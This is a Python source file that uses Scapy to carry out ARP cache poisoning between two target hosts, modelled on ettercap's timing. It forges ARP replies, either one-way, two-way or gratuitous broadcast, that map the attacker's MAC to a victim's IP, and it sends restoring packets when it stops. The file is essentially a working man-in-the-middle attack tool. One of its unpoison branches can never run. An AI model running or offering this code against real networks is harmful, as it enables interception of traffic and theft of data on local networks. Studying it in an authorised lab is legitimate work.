from scapy.all import *
import spoofing_tool as spoof
import time
import sys

START_COUNT = 5 # ettercap starts poisoning with 5 packets
MIDDLE_COUNT = 200#sys.maxint # ettercap keeps poisoning for 200 packets
END_COUNT = 3 # ettercap ends poisoning with 3 packets

START_INTERVAL = 1 # ettercap sends packets every second
MIDDLE_INTERVAL = 10 # ettercap sends packets every 10 seconds
END_INTERVAL = 1 # ettercap sends packets every second

ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"

# main function
def arp_spoofing(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, gratuitious):
    spoof.clear()
    spoof.printf("Spoofing the connection between " + ipT1 + " and " + ipT2, 0)
    spoof.printf("")

    spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)
    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 1)

    spoof.printf("Poisoning initiated.", 4)
    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2, gratuitious)

    spoof.printf("Stopping poisoning!!! (Do not kill the program)", 4)
    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2)


def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, macT1, ipT1, ONE_WAY_TOKEN, ipT2, macAtk, ipAtk, iface, 1)

def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
    arp_poison(macT1, ipT1, ONE_WAY_TOKEN, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious)

def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, macT1, ipT1, macT2, ipT2, ONE_WAY_TOKEN, ipAtk, iface, 2)

def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
    while m > 0:
        if time.time() - last_sent_time > n:
            if should_poison:
                arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious)
            else:
                arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type)     
            last_sent_time = time.time()
            m -= 1
    
def arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
    if macT2 == ONE_WAY_TOKEN:
        send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitious)
    elif macT1 == ONE_WAY_TOKEN:
        send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitious)
    else:
        send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)

def arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
    gratuitious = False
    if macAtk == ONE_WAY_TOKEN:
        send_one_directional(macT1, ipT1, ipT2, macT2, iface, pkt_type, gratuitious)
    elif macAtk == ONE_WAY_TOKEN:
        send_one_directional(macT2, ipT2, ipT1, macT1, iface, pkt_type, gratuitious)
    else:
        send_bi_directional(ipT2, macT2, ipT1, macT1, macT2, macT1, iface, pkt_type, gratuitious)    

def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratuitious):
    # poison ARP table of the target
    arp_t = build_packet(_macAtk, _ipT2, _macT1, _ipT1, pkt_type, gratuitious)

    # send the packet
    sendp(arp_t, iface=_iface)

def send_bi_directional(_ipM2, _macM2, _ipM1, _macM1, _macM31, _macM32, _iface, pkt_type, gratuitious):
    # poison ARP table of T1
    arp_m1 = build_packet(_macM31, _ipM2, _macM1, _ipM1, pkt_type, gratuitious)
    # poison ARP table of T2
    arp_m2 = build_packet(_macM32, _ipM1, _macM2, _ipM2, pkt_type, gratuitious)

    # send the packets
    sendp([arp_m1, arp_m2], iface=_iface)

def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type, gratuitious):
    packet = Ether() / ARP()
    packet[Ether].src = macAttacker
    packet[ARP].hwsrc = macAttacker # Send the MAC address of the attacker
    packet[ARP].psrc  = ipToSpoof   # as the spoofed IP address.

    if gratuitious:
        packet[Ether].dst = "ff:ff:ff:ff:ff:ff"
        packet[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
        packet[ARP].pdst  = ipToSpoof
        packet[ARP].op = 2 # 1 = request, 2 = reply
    else:
        packet[ARP].hwdst = macVictim
        packet[ARP].pdst  = ipVictim
        packet[ARP].op = pkt_type # 1 = request, 2 = reply

    return packet